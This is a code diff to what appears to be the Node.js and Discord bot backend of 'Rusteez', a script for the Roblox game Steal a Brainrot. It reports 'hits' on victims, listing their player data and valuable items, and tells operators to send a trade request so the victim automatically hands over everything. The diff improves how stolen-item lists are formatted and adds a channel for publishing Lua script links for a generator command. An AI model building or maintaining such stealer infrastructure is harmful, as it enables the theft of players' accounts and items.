@@ -531,8 +531,7 @@ wss.on('connection', (ws, req) => {
                     const hitEmbed = new EmbedBuilder()
                     .setTitle("Rusteez • SAB Hit")
                     .setColor(0x2b2d31)
-                    .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.\n` + 
-                        `🔗 **[Rejoin Rusteez Script Server](https://discord.gg/78CmkaUhZy)**`)
+                    .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.`)
                     .addFields(
                         { 
                             name: "📄 Player Information", 
@@ -541,8 +540,37 @@ wss.on('connection', (ws, req) => {
                         {
                             name: "👑 Valuable Brainrots",
                             value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
-                                ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → ${br.Rarity} ${br.IncomeStr}`).join('\n')
+                                ? hitInfo.Brainrots.map(br => {
+                                    // 1. Préparation des éléments (Mutation + Traits)
+                                    let extras = [];
+                                    
+                                    // On ajoute la mutation en premier si elle existe
+                                    if (br.Mutation && br.Mutation !== "" && br.Mutation !== "None") {
+                                        extras.push(br.Mutation);
+                                    }
+                                    
+                                    // On ajoute les traits (qu'ils soient déjà une string ou un array)
+                                    if (br.Traits) {
+                                        if (Array.isArray(br.Traits)) {
+                                            br.Traits.forEach(t => { if(t && t !== "") extras.push(t); });
+                                        } else if (typeof br.Traits === 'string' && br.Traits !== "" && br.Traits !== "None") {
+                                            extras.push(br.Traits);
+                                        }
+                                    }
+                        
+                                    // 2. Formatage : [Diamond, Nyan, Taco] ou rien du tout
+                                    const extrasStr = extras.length > 0 ? `[${extras.join(', ')}] ` : "";
+                        
+                                    // 3. Retour de la ligne formatée
+                                    return `🧠 → ${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
+                                }).join('\n')
                                 : "None"}\n\`\`\``
+                        },
+                        {
+                           // NOUVEAU FIELD POUR LE LIEN
+                           name: "🔗 Discord",
+                           value: `**[Join Rusteez Server](https://discord.gg/78CmkaUhZy)**`,
+                           inline: false
                         }
                     )
                     .setFooter({ text: `Rusteez Script` })
@@ -574,8 +602,7 @@ wss.on('connection', (ws, req) => {
                         const publicEmbed = new EmbedBuilder()
                             .setTitle("Rusteez • SAB Hit")
                             .setColor(0x2b2d31)
-                            .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.\n` + 
-                                `🔗 **[Rejoin Rusteez Script Server](https://discord.gg/78CmkaUhZy)**`)
+                            .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.`)
                             .addFields(
                                 { 
                                     name: "📄 Player Information", 
@@ -585,8 +612,37 @@ wss.on('connection', (ws, req) => {
                                 {
                                     name: "👑 Valuable Brainrots",
                                     value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
-                                        ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → ${br.Rarity} ${br.IncomeStr}`).join('\n')
+                                        ? hitInfo.Brainrots.map(br => {
+                                            // 1. Préparation des éléments (Mutation + Traits)
+                                            let extras = [];
+                                            
+                                            // On ajoute la mutation en premier si elle existe
+                                            if (br.Mutation && br.Mutation !== "" && br.Mutation !== "None") {
+                                                extras.push(br.Mutation);
+                                            }
+                                            
+                                            // On ajoute les traits (qu'ils soient déjà une string ou un array)
+                                            if (br.Traits) {
+                                                if (Array.isArray(br.Traits)) {
+                                                    br.Traits.forEach(t => { if(t && t !== "") extras.push(t); });
+                                                } else if (typeof br.Traits === 'string' && br.Traits !== "" && br.Traits !== "None") {
+                                                    extras.push(br.Traits);
+                                                }
+                                            }
+                                
+                                            // 2. Formatage : [Diamond, Nyan, Taco] ou rien du tout
+                                            const extrasStr = extras.length > 0 ? `[${extras.join(', ')}] ` : "";
+                                
+                                            // 3. Retour de la ligne formatée
+                                            return `🧠 → ${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
+                                        }).join('\n')
                                         : "None"}\n\`\`\``
+                                },
+                                {
+                                    // NOUVEAU FIELD POUR LE LIEN
+                                    name: "🔗 Discord",
+                                    value: `**[Join Rusteez Server](https://discord.gg/78CmkaUhZy)**`,
+                                    inline: false
                                 }
                             )
                             .setFooter({ text: `Rusteez Script` })
@@ -610,8 +666,7 @@ async function sendManualHit(hitData) {
     const publicEmbed = new EmbedBuilder()
         .setTitle("Rusteez • SAB Hit")
         .setColor(0x2b2d31)
-        .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.\n` + 
-                       `🔗 **[Rejoin Rusteez Script Server](https://discord.gg/78CmkaUhZy)**`)
+        .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.`)
         .addFields(
             { 
                 name: "📄 Player Information", 
@@ -620,6 +675,12 @@ async function sendManualHit(hitData) {
             {
                 name: "👑 Valuable Brainrots",
                 value: `\`\`\`properties\n${hitData.brainrots}\n\`\`\``
+            },
+            {
+                // NOUVEAU FIELD POUR LE LIEN
+                name: "🔗 Discord",
+                value: `**[Join Rusteez Server](https://discord.gg/78CmkaUhZy)**`,
+                inline: false
             }
         )
         .setFooter({ text: `Rusteez Script`})
@@ -640,13 +701,33 @@ app.post('/api/admin/setup-discord', async (req, res) => {
         else if (type === 'disclaimer') await sendLegalDisclaimer();
         else if (type === 'tutorial') await sendTutorial();
         else if (type === 'manual_hit') await sendManualHit(data); // Nouvelle condition
-        
+        else if (type === 'publish_visual') await publishVisual(data);
         res.json({ success: true, message: "Action exécutée !" });
     } catch (error) {
         res.status(500).json({ success: false, message: error.message });
     }
 });
+async function publishVisual(visualData) {
+    const visualChannel = await clientDiscord.channels.fetch('1487394300844183652').catch(() => null);
+    if (!visualChannel) throw new Error("Visual Channel introuvable");
 
+    const visualEmbed = new EmbedBuilder()
+        .setTitle(`🖼️ ${visualData.title.toUpperCase()}`)
+        .setColor(0xf59e0b) // Orange Ambre
+        .setDescription("To use this visual, copy the Raw URL below and paste it into the `/generate` command.")
+        .addFields(
+            { name: "📜 Script / Raw Link", value: `\`\`\`\n${visualData.lua}\n\`\`\`` }
+        )
+        .setFooter({ text: "Rusteez Visual Library" })
+        .setTimestamp();
+
+    // On ajoute l'image seulement si le lien est valide
+    if (visualData.image && visualData.image.startsWith('http')) {
+        visualEmbed.setImage(visualData.image);
+    }
+
+    await visualChannel.send({ embeds: [visualEmbed] });
+}
 async function sendLegalDisclaimer() {
     const channelId = "1487369531058815096";
     const channel = await clientDiscord.channels.fetch(channelId);
